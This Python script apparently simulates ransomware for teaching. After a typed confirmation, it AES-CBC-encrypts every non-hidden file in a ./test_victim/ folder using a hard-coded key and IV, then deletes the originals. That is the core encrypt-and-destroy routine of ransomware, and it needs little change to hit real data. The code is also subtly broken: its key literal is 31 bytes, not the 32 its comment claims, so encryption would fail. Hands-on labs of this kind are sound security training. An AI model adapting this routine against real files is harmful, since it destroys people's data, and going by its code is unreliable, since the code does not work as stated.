#!/usr/bin/env python3
"""
SAFE RANSOMWARE SIMULATION - ENCRYPTER
Educational purpose only. Encrypts ONLY files in ./test_victim/ directory.
Uses AES-256 in CBC mode with a fixed key for demonstration.
"""

import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import secrets

# FIXED KEY FOR DEMO (In real ransomware, this would be random and exfiltrated)
KEY = b'YourSafeDemoKey1234567890123456'  # 32 bytes for AES-256
IV = b'DemoIV1234567890'  # 16 bytes for AES block size

def encrypt_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        # Pad data to block size
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        
        # Encrypt
        cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV))
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        
        # Save as .encrypted
        with open(file_path + '.encrypted', 'wb') as f:
            f.write(encrypted_data)
        
        # Remove original (optional - for realism)
        os.remove(file_path)
        print(f"[+] Encrypted: {file_path}")
        
    except Exception as e:
        print(f"[-] Failed to encrypt {file_path}: {e}")

def main():
    print("🔒 SAFE RANSOMWARE SIMULATION - ENCRYPTER")
    print("⚠️  This will ONLY affect files in ./test_victim/")
    print("📁 Ensure you have created ./test_victim/ with test files!")
    
    confirm = input("\nType 'ENCRYPT' to proceed: ")
    if confirm != 'ENCRYPT':
        print("Aborted.")
        return
    
    victim_dir = "./test_victim"
    if not os.path.exists(victim_dir):
        print(f"Error: {victim_dir} does not exist!")
        return
    
    for filename in os.listdir(victim_dir):
        filepath = os.path.join(victim_dir, filename)
        if os.path.isfile(filepath) and not filename.startswith('.'):
            encrypt_file(filepath)
    
    print("\n✅ Encryption complete. To decrypt, run decrypter.py")

if __name__ == "__main__":
    main()
